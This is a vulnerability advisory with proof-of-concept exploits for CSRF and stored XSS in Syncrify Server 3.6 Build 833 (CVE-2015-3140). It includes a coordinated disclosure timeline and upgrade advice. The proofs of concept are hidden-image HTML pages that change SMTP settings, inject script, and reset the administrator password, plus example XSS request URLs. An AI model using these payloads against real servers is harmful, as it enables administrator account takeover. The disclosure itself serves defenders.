@@ -1,0 +1,55 @@
+# Exploit Title: Multiple vulnerabilities in Syncrify Server 3.6 Build 833 (CSRF/Stored XSS)
+# Date: 07-05-2015
+# Exploit Author: Marlow Tannhauser
+# Contact: marlowtannhauser@gmail.com
+# Vendor Homepage: http://www.synametrics.com
+# Software Link: http://web.synametrics.com/SyncrifyDownload.htm
+# Version: 3.6 Build 833. Earlier versions may also be affected.
+# CVE: 2015-3140
+# Category: Web apps
+
+
+# DISCLOSURE TIMELINE #
+08/02/2015: Initial disclosure to vendor and CERT
+09/02/2015: Acknowledgment of vulnerabilities from vendor
+11/02/2015: Disclosure deadline of 01/03/2015 agreed with vendor
+19/02/2015: Disclosure deadline renegotiated to 01/04/2015 at vendor's request
+09/04/2015: Disclosure deadline renegotiated to 20/04/2015 at vendor's request
+20/04/2015: Confirmation of fix from vendor
+07/05/2015: Disclosure
+
+Note that the CVE-ID is for the CSRF vulnerability only. No CVE-ID has been generated for the stored XSS vulnerabilities. The vulnerable version of the product is no longer available for download from the vendor's webpage.
+
+
+# EXPLOIT DESCRIPTION #
+Syncrify 3.6 Build 833 is vulnerable to CSRF attacks, which can also be combined with stored XSS attacks (authenticated administrators only). The JSESSIONID created when a user logs on to the system is persistent and does not change across requests.
+
+
+# POC 1 #
+The following PoC uses the CSRF vulnerability to change the SMTP settings in the application, and combines it with two of the stored XSS vulnerabilities.
+
+<html>
+<img src="http://192.168.0.8:5800/app?adminEmail=%3Cscript%3Ealert%28VICTIM%29%3C%2Fscript%3E&smtpServer=127.0.0.1&smtpPort=25&smtpUser=%3Cscript%3Ealert%284%29%3C%2Fscript%3E&smtpPassword=admin&smtpSecurity=None&proceedButton=Save&operation=config&st=saveSmtp" alt="" width="1" height="1">
+</html>
+
+
+# POC 2 #
+The following PoC uses the CSRF vulnerability to change the administrator password.
+
+<html>
+<img src="http://192.168.0.8:5800/app?adminPassword=MARLOW&alertInvalidPassword=true&blockIP=false&alertManualPath=false&proceedButton=Save&operation=config&st=saveSecurity" width="0" height="0" border="0">
+</html>
+
+
+# STORED XSS VULNERABILITIES #
+Stored XSS vulnerabilities are present in the following fields:
+
+Manage Users > Add New User > User's Full Name [displayed in Reports > Backup report by user]
+Example URL: http://192.168.0.8:5800/app?fullName=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&login=user%40user.com&password=password&numVersionsToKeep=0&diskQuota=-1&selectedPath=%2Fhome%2F&operation=manageUsers&st=addUser#
+
+Configuration > Email Configuration > Administrator's Email [displayed in Troubleshoot and Reports pages]
+Example URL: http://192.168.0.8:5800/app?adminEmail=%3Cscript%3Ealert%28VICTIM%29%3C%2Fscript%3E&smtpServer=127.0.0.1&smtpPort=25&smtpUser=%3Cscript%3Ealert%284%29%3C%2Fscript%3E&smtpPassword=admin&smtpSecurity=None&proceedButton=Save&operation=config&st=saveSmtp
+
+
+# MITIGATION #
+Upgrade to the latest build of Syncrify Server, available from the link shown.
